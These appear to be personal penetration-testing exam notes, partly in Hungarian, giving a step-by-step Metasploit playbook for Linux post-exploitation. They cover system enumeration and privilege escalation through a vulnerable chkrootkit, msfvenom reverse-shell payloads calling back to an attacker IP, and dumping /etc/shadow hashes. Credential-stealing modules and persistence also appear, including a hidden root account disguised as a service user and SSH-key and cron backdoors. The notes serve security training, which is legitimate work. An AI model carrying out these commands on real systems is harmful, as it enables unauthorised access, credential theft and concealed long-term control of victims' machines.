# Linux post exploitation
## Linux post exploitation modules
### basic local linux enumeration
  * meterpreter> shell
  * $ /bin/bash -i
  * root@machine$
    * whoami, cat /etc/passwd, groups <group_name>
    * cat /etc/*issue (OS flavor)
    * uname -r (kernel version)
    * uname -a (hostname, kernel version, architecture, ...)
    * ifconfig, ip a, netstat -antp (lehet hogy nem mukodik), ps aux, env,
### msf linux exploitation modules
* msf6> use post/linux/gather/enum_configs (gather linux configurations) (loot!!!)
  * msf6> loot (meg tudjuk nezni hogy az osszeszedett infok melyik fajlokban vannak eltarolva)
  * utana sima 'cat'-el meg tudjuk nezni a fajlnak a tartalmat...
* msf6> use post/linux/gather/enum_system (system enumeration)
  * (packages, services, mounts, users, bash history, cron jobs, ...)
* msf6> use post/linux/gather/enum_users_history (gather bash_history file for or user accounts and service accounts)
  * (normalis ha sok errort dob, mert sok service user-hez nincsen bash history)
* msf6> use post/multi/gather/env (env vars)
* msf6> use post/linux/gather/enum_network (network enum) (loot kiirja a tarolt infok helyet - aztan egyesevel cat...)
* msf6> use post/linux/gather/enum_protections (system hardening mechanisms check)
  * notes nevu cuccba ment (csak be kell irni az msf console-ba hogy notes es kiirja)
* msf6> use post/linux/gather/checkcontainer (check if machine is a container (like docker), or normal host machine)
  * it is important because techniques are exists where we can break out of container, vm...
* msf6> use post/linux/gather/checkvm (check if the machine is a vm or not)
  * it is important because techniques are exists where we can break out of container, vm...
### info (loot!!!)
* ahol fajlnevek vannak felsorolva es ugy szedett le infokat
* ott a loot parancs kiirja, hogy hol talaljuk meg a fajlt
* es aztan sima 'cat'-el megtudjuk nezni hogy mi van benne (cat az msf console-bol is mukodik)
### info (notes!!!)
* ahol ilyesmit ir a futtatas utan az msf console, hogy
  * <valami_config_vagy_check> saved to notes.
* ott a notes paranccsal lehet majd kiiratni
  * msf6> notes
## Linux privilege escalation - exploiting vulnerable program
* initial steps
  * login through ssh in msf console with known credentials
    * msf6> use auxiliary/scanner/ssh/ssh_login
    * give username, and password and run
    * nyit egy shell-t de a hatterben (sima shell lesz - sessions)
    * upgrade standard shell to meterpreter shell
* meterpreter> shell
* $ ps aux
  * root futtat /bin/bash-bol egy shell scriptet ami egy irhato mappaban van
    * a script chkrootkit nevu cuccot futtat
    * annak vannak serulekeny valtozatai
* $ chkrootkit -V
  * chkrootkit version 0.49 (VULNERABLE !!!!)
* msf6> use exploit/unix/local/chkrootkit
* msf6 exploit(unix/local/chkrootkit)> set CHKROOTKIT <path_of_chkrootkit_file_on_the_os> (e.g. /bin/chkrootkit)
  * maybe we have to set lhost and lport
  * maybe we have to modify the 'CHKROOTKIT' option (this is the path)
* it will be create a cron job
* it probably opens a shell session here!!!
  * try to put command in the terminal (like whoami)
* upgrade to meterpreter
  * if sessions -u <num> nem mukodik
    * manualisan csinaljunk msfvenommal meterpreter reverse shell-t
      * msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=1234 -f elf -o start
      * msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=1234 -f elf -o start
    * md5sum-ot csekkoljuk le
    * csinaljunk belole base64 code-ot (-w 0 miatt nem lesz tobb sorra tordeles)
      * $ cat exploit_file | base64 -w 0
    * menjunk be a session-be es irjuk bele egy fajlba a base64 code-ot dekodolva, aztan chmod, es checksum
      * $ echo -n '<base64_code_of_exploit>' | base64 -d > new_file
      * $ chmod 777 new_file
      * md5sum new_file
    * inditsunk el multi handlert background jobkent
      * msf6> use multi/handler
      * ... set lhost, lport, payload ...
      * msf6 multi(handler)> run -j
    * menjunk vissza a shell session-be es inditsuk el a meterpreter shell exploitot, aztan utana CTRL+Y, es ott az uj session
      * meterpreter> shell
      * $ ./new_file
        *  (output) ... [*] Meterpreter session <num> opened (ip:port -> ip:port) at <date> <time>
      * $ CTRL + Y
      * msf6> sessions -i <new_session_num>
      * meterpreter> (meg van a meterpreter shell)
## Dumping hashes with hashdump
### info
* on linux the 'meterpreter> hashdump' command is not working
* we need to use the post exploitation module instead
* it is the same the followings
  * $ cat /etc/passwd
  * $ cat /etc/shadow
  * $ unshadow /etc/passwd /etc/shadow > new_file
### steps
* msf6> use post/linux/gather/hashdump
* msf6 post(linux/gather/hashdump)> set session <num>
* msf6 post(linux/gather/hashdump)> run
* elmenti egy fajlba
* msf6> loot
* msf6> cat <file_copied_from_loot_command_output>
### other usefull modules
* msf6> use post/multi/gather/ssh_creds
* msf6> use post/multi/gather/docker_creds
* msf6> use post/linux/gather/hashdump
* msf6> use post/linux/gather/ecryptfs_creds
* msf6> use post/linux/gather/enum_psk
* msf6> use post/linux/gather/enum_xchat
* msf6> use post/linux/gather/phpmyadmin_credsteal
* msf6> use post/linux/gather/pptpd_chap_secrets
* msf6> use post/linux/manage/sshkey_persistence
  * set createsshfolder true (enelkul nem biztos hogy mukodik)
  * minden userhez letrehozza!!! ha csak 1hez akarjuk, akkor allitsuk be a USERNAME option-t
### if we have root user access - it is not very very neccessary to crack password hashes
* 1
  * we can create a new user, add him a password, make him root as well
  * enable ssh
  * connect at ssh whenever we want
  * and thats all
* 2
  * also we can modify an arbitrary user's password to anything (with root access to the system)
## Persistence on Linux (VIZSGA ALATT NE CSINALJUK !!! SOK BAJ LEHET BELOLE !!!)
### info
* EGYEDUL AZ MSFCONSOLE SSH_PERSISTENCE MODUL JO OTLET, A TOBBIT NE CSINALJUK INKABB
  * ahhoz vagy csinalunk uj usert a manualis technikaval
  * vagy a root userrel hasznaljuk
### manual method (creating ssh connection)
* meterpreter> shell
* $ useradd -m user2 -s /bin/bash (adding new user)
  * (we can use a name that is similar to a service account name like 'ftp' for hiding purposes)
  * (-s megadjuk neki a bash mint default terminal)
  * (-m utan adhatunk home dirt is, ha nem adunk az ugy kevesbe feltuno)
* $ passwd username2 (setting password to the new user)
  * Enter new UNIX password: type_password_here
* $ cat /etc/passwd (check created user)
* $ usermod -aG root user2 (make the user root)
* $ groups user2 (check group access)
* usermod -u random_num user2 (change userid for the user)
  * because new users will be presented at the bottom
  * it can more easily hide if it is in the middle of the services users in passwd file
### other manual methods
* cretaing persistance service or cron job
* adding new ssh key for ssh connection (for an existing user)
### msf persistence modules
* msf6> use post/linux/manage/sshkey_persistence (noisy method, for exam it is okay)
  * set CREATESSHFOLDER true
  * alapbol minden user-hez hozzaadja az ssh kulcsot
    * ha csak 1 userhez akarjuk hozzaadni akkor USERNAME-et kell beallitani pluszba
   * msf6> loot
   * msf6> cat <created_ssh_id_rsa_file>
   * root@attack_machine$ nano /root/ssh_key
   * insert private key
   * root@attack_machine$ chmod 700 ssh_key
     *  nem mukodik chmod 777-el mert kiirja, hogy tul sok priv van !!!!!
   * root@attack_machine$ ssh -i ssh_key root@<victim_ip> (login as root)
   * root@attack_machine$ ssh -i ssh_key user2@<victim_ip> (login as other users)
   * DONE
* msf6> use exploit/linux/local/cron_persistence (second best option)
  * cron jobs can be easily detected by sysadmins
  * for exam purposes - it is good
  * timing is fine (default is 60 seconds)
  * alapbol hibat dob es azt irja, hogy varjunk 90 sec-et
    * modositsuk az lhost-ot es az lport-ot (lport legyen valami random nem hasznalt port)
  * nem biztos hogy mukodni fog rendesen (cron problemas lehet mukodes szempontjabol)
    * varjunk 90 sec-et ha erdemes
    * ha 'removing cron entry' szoveg van akkor nem fog mukodni
* msf6> use exploit/linux/local/service_persistence (strange option)
  * set payload cmd/unix/reverse_python
  * set lhost, lport (lport elvileg olyan kell hogy legyen, ami mar van valami meterpreter shell...)
  * lehet hogy ujraindit egy service-t
  * debugging
    * set target 3, 4
* msf6> use exploit/linux/local/apt_package_manager_persistence (not a good choice)
  * it uses package manager (it is not too stable we should not be use it)
